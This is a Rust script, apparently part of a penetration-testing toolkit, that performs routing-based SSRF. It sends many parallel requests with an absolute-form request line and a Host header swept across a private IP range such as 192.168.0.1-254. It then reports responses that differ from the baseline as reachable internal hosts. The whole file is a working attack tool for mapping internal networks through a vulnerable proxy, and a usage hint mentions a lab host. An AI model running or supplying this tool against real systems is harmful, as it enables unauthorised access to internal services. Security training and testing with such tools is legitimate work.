#!/usr/bin/env rust-script
//! name: abs_sweep
//! description: Absolute-form request-line sweep with a fuzzed Host header value - sends `GET <scheme>://<host><path> HTTP/1.1` with `Host: <net>.FUZZ` plus caller headers/cookies, in parallel TLS/TCP threads, and reports per-value status/bytes/digest/snippet with the outliers against the dominant baseline, so routing-based SSRF via flawed request parsing is swept in ONE envelope (origin-form and header-name variants stay with conn_reuse).
//! version: 1.0.0
//! args: <url> [--net 192.168.0] [--ids 1-254|1,3,9] [--path /] [--header 'K: V']... [--cookie STR] [--threads N] [--snippet N] [--marker S] [--timeout-ms N] [--selftest]
//! keywords: ssrf, host-header, absolute-uri, request-line, sweep, routing, routing-based
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! serde_json = "1"
//! ```
use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{mpsc, Arc};
use std::time::Duration;

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn split_url(url: &str) -> Result<(bool, String, u16), String> {
    let (tls, rest) = if let Some(r) = url.strip_prefix("https://") {
        (true, r)
    } else if let Some(r) = url.strip_prefix("http://") {
        (false, r)
    } else {
        return Err(format!("url needs a scheme: {url}"));
    };
    let hostport = rest.split('/').next().unwrap_or("").to_string();
    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) => (h.to_string(), p.parse::<u16>().map_err(|e| format!("bad port {p}: {e}"))?),
        None => (hostport, if tls { 443 } else { 80 }),
    };
    if host.is_empty() {
        return Err("empty host in url".to_string());
    }
    Ok((tls, host, port))
}

fn expand_ids(spec: &str) -> Vec<u32> {
    let mut out = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some((a, b)) = part.split_once('-') {
            if let (Ok(a), Ok(b)) = (a.trim().parse::<u32>(), b.trim().parse::<u32>()) {
                out.extend(a..=b);
            }
        } else if let Ok(v) = part.parse::<u32>() {
            out.push(v);
        }
    }
    out
}

fn send(
    host: &str,
    port: u16,
    tls: bool,
    request: &str,
    timeout_ms: u64,
) -> Result<(u16, String, String), String> {
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_read_timeout(Some(Duration::from_millis(timeout_ms)));
    let _ = tcp.set_write_timeout(Some(Duration::from_millis(timeout_ms)));
    let mut raw = Vec::new();
    if tls {
        let mut roots = rustls::RootCertStore::empty();
        roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        let config = rustls::ClientConfig::builder()
            .with_root_certificates(roots)
            .with_no_client_auth();
        let server_name = rustls::pki_types::ServerName::try_from(host.to_string())
            .map_err(|e| format!("bad server name: {e}"))?;
        let conn = rustls::ClientConnection::new(Arc::new(config), server_name)
            .map_err(|e| format!("tls init: {e}"))?;
        let mut stream = rustls::StreamOwned::new(conn, tcp);
        stream.write_all(request.as_bytes()).map_err(|e| format!("write: {e}"))?;
        stream.read_to_end(&mut raw).map_err(|e| format!("read: {e}"))?;
    } else {
        let mut stream = tcp;
        stream.write_all(request.as_bytes()).map_err(|e| format!("write: {e}"))?;
        stream.read_to_end(&mut raw).map_err(|e| format!("read: {e}"))?;
    }
    let text = String::from_utf8_lossy(&raw).into_owned();
    let head = text.split("\r\n\r\n").next().unwrap_or("").to_string();
    let body = text.split_once("\r\n\r\n").map(|(_, b)| b.to_string()).unwrap_or_default();
    let status = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    Ok((status, head, body))
}

fn digest_of(body: &str) -> u64 {
    use std::hash::{Hash, Hasher};
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    body.hash(&mut hasher);
    hasher.finish()
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut url = String::new();
    let mut net = String::from("192.168.0");
    let mut ids_spec = String::from("1-254");
    let mut path = String::from("/");
    let mut headers: Vec<(String, String)> = Vec::new();
    let mut cookie = String::new();
    let mut threads = 16usize;
    let mut snippet = 160usize;
    let mut marker: Option<String> = None;
    let mut timeout_ms = 8000u64;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--net" => { i += 1; net = arg(&args, i); }
            "--ids" => { i += 1; ids_spec = arg(&args, i); }
            "--path" => { i += 1; path = arg(&args, i); }
            "--header" => {
                i += 1;
                let kv = arg(&args, i);
                if let Some((k, v)) = kv.split_once(':') {
                    headers.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
            "--cookie" => { i += 1; cookie = arg(&args, i); }
            "--threads" => { i += 1; threads = arg(&args, i).parse().unwrap_or(16).max(1); }
            "--snippet" => { i += 1; snippet = arg(&args, i).parse().unwrap_or(160); }
            "--marker" => { i += 1; marker = Some(arg(&args, i)); }
            "--timeout-ms" => { i += 1; timeout_ms = arg(&args, i).parse().unwrap_or(8000); }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    let (tls, host, port) = match split_url(&url) {
        Ok(v) => v,
        Err(e) => {
            pi_rust_lib::report::failure("abs_sweep", &e, "call as: abs_sweep https://<lab-host>/ --net 192.168.0 --ids 1-254");
            std::process::exit(2);
        }
    };
    let ids = expand_ids(&ids_spec);
    if ids.is_empty() {
        pi_rust_lib::report::failure("abs_sweep", "no ids", "use --ids 1-254");
        std::process::exit(2);
    }
    let scheme = if tls { "https" } else { "http" };
    let abs = format!("{scheme}://{host}");
    let chunks: Vec<Vec<u32>> = {
        let mut c: Vec<Vec<u32>> = vec![Vec::new(); threads];
        for (n, id) in ids.iter().enumerate() {
            c[n % threads].push(*id);
        }
        c.into_iter().filter(|v| !v.is_empty()).collect()
    };
    let (tx, rx) = mpsc::channel::<(u32, Value)>();
    let mut handles = Vec::new();
    for chunk in chunks {
        let host = host.clone();
        let net = net.clone();
        let path = path.clone();
        let abs = abs.clone();
        let headers = headers.clone();
        let cookie = cookie.clone();
        let marker = marker.clone();
        let tx = tx.clone();
        handles.push(std::thread::spawn(move || {
            for id in chunk {
                let mut req = format!("GET {abs}{path} HTTP/1.1\r\nHost: {net}.{id}\r\n");
                if !cookie.is_empty() {
                    req.push_str(&format!("Cookie: {cookie}\r\n"));
                }
                for (k, v) in &headers {
                    req.push_str(&format!("{k}: {v}\r\n"));
                }
                req.push_str("Connection: close\r\n\r\n");
                let row = match send(&host, port, tls, &req, timeout_ms) {
                    Ok((status, _head, body)) => {
                        let d = digest_of(&body);
                        let mut r = json!({
                            "id": id,
                            "status": status,
                            "bytes": body.len(),
                            "digest": format!("{d:016x}"),
                        });
                        if let Some(m) = &marker {
                            r["marker_hit"] = json!(body.contains(m.as_str()));
                        }
                        r["snippet"] = json!(body.chars().take(snippet).collect::<String>());
                        r
                    }
                    Err(e) => json!({ "id": id, "error": e }),
                };
                let _ = tx.send((id, row));
            }
        }));
    }
    drop(tx);
    let mut rows: Vec<(u32, Value)> = Vec::new();
    while let Ok(v) = rx.recv() {
        rows.push(v);
    }
    for h in handles {
        let _ = h.join();
    }
    rows.sort_by_key(|(id, _)| *id);
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    for (_, r) in &rows {
        let key = r
            .get("status")
            .and_then(|v| v.as_u64())
            .map(|s| s.to_string())
            .unwrap_or_else(|| "err".to_string());
        *counts.entry(key).or_insert(0) += 1;
    }
    // baseline = the most common (status,digest) pair; outliers are everything else.
    let mut sig_counts: BTreeMap<String, usize> = BTreeMap::new();
    for (_, r) in &rows {
        let sig = format!(
            "{}|{}",
            r.get("status").and_then(|v| v.as_u64()).unwrap_or(0),
            r.get("digest").and_then(|v| v.as_str()).unwrap_or("-")
        );
        *sig_counts.entry(sig).or_insert(0) += 1;
    }
    let baseline = sig_counts
        .iter()
        .max_by_key(|(_, n)| **n)
        .map(|(k, n)| (k.clone(), *n))
        .unwrap_or(("none".to_string(), 0));
    let outliers: Vec<Value> = rows
        .iter()
        .filter(|(_, r)| {
            let sig = format!(
                "{}|{}",
                r.get("status").and_then(|v| v.as_u64()).unwrap_or(0),
                r.get("digest").and_then(|v| v.as_str()).unwrap_or("-")
            );
            sig != baseline.0
        })
        .map(|(id, r)| {
            json!({
                "id": id,
                "status": r.get("status"),
                "bytes": r.get("bytes"),
                "digest": r.get("digest"),
                "marker_hit": r.get("marker_hit"),
                "snippet": r.get("snippet"),
            })
        })
        .collect();
    let payload = json!({
        "url": url,
        "absolute_line": format!("GET {abs}{path} HTTP/1.1"),
        "host_values": format!("{net}.<id>"),
        "probed": rows.len(),
        "status_counts": counts,
        "baseline": { "signature": baseline.0, "count": baseline.1 },
        "outlier_count": outliers.len(),
        "outliers": outliers,
        "rows": rows.iter().map(|(_, r)| r.clone()).collect::<Vec<Value>>(),
    });
    pi_rust_lib::report::success(
        "abs_sweep",
        payload,
        "read the outliers: a status/digest that differs from the baseline is the routed internal host",
    )
    .expect("report success");
}

fn selftest() {
    let ok = split_url("https://a.test/").map(|(t, h, p)| t && h == "a.test" && p == 443).unwrap_or(false)
        && split_url("http://b.test:8080/x").map(|(t, h, p)| !t && h == "b.test" && p == 8080).unwrap_or(false)
        && expand_ids("1-3,7") == vec![1, 2, 3, 7]
        && digest_of("abc") == digest_of("abc");
    let data = json!({"selftest": if ok {"ok"} else {"fail"}});
    if ok {
        pi_rust_lib::report::success("abs_sweep", data, "selftest passed; ready to run").expect("report");
    } else {
        pi_rust_lib::report::failure("abs_sweep", "selftest failed", "inspect url/ids parsing");
        std::process::exit(1);
    }
}
